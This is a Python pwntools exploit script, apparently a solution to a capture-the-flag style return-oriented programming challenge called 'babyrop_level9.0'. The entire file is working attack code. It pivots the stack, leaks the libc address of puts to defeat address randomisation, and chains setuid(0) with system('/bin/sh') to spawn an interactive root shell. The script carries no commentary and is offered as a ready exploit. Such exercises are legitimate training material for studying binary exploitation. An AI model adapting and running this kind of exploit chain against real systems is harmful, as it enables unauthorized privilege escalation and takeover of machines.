from pwn import *
elf = context.binary = ELF("/challenge/babyrop_level9.0")
context.terminal = ["tmux", "splitw", "-h"]
p = process()
#p = gdb.debug("/challenge/babyrop_level9.0")
ret = 0x000000000040101a
pop_rdi = 0x0000000000402673
pop_rbp = 0x000000000040129d
leave_ret = 0x00000000004016d6
bss = 0x4150f0
entry = 0x004011d0
put_plt = elf.plt['puts']
put_got = elf.got['puts']
payload = p64(pop_rbp) + p64(bss) + p64(leave_ret)
payload += p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(entry)
p.send(payload)
p.recvuntil(b'Leaving!\n')
temp = p.recvline().strip(b'\n')
log.info("Temp: %s", temp)
puts_leak = u64(temp.ljust(8,b'\x00'))
log.success("Leaked puts: %s", hex(puts_leak))
system_address = puts_leak -205200
setuid = puts_leak + 392496
bin_sh = puts_leak + 1245597
payload2 = p64(pop_rbp) + p64(bss) + p64(leave_ret) + p64(ret)
payload2 += p64(pop_rdi) + p64(0) + p64(setuid) + p64(ret)
payload2 += p64(pop_rdi) + p64(bin_sh) + p64(system_address) + p64(0x0)
p.send(payload2)
p.interactive()